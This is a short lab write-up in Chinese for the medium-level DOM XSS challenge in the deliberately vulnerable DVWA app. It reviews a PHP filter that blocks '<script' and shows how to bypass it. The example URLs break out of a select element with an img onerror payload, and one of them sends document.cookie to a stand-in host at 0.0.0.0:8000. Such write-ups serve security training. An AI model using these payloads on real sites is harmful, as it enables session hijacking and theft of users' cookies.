# XSS (DOM) - Medium

## View Source

```PHP
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

- [`array_key_exists($a, $b)`](https://www.php.net/manual/zh/function.array-key-exists.php)
    - *b* 裡存在 *a* (*key*) 就回傳 *true*；沒有就回傳 *false*
- [`is_null($a)`](https://www.php.net/manual/zh/function.is-null.php)
    - *a* 是 *null* 就回傳 *true*；不是 *null* 就回傳 *false*
- [`stripos($a, $b)`](https://www.php.net/manual/zh/function.stripos.php)
    - 回傳 *b* 在 *a* 第一次出現的位置 (不分大小寫)

## Code Review

- 如果存在 *default* 且不為空
- 就檢查有沒有 `<script` 這個關鍵字
- 有的話就重導向成 `?default=English`

## Answer

- 可參考 [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- 透過 `img` *tag* 來觸發並執行惡意的 *JavaScript* 語句
    - 因為下拉式選單不能塞 `img`，所以要先關閉

### Example

```
http://127.0.0.1/vulnerabilities/xss_d/?default=</option></select><img src onerror=alert(1)>
http://127.0.0.1/vulnerabilities/xss_d/?default=</option></select><img src onerror="window.open('http://0.0.0.0:8000/?cookie=' + document.cookie)">
```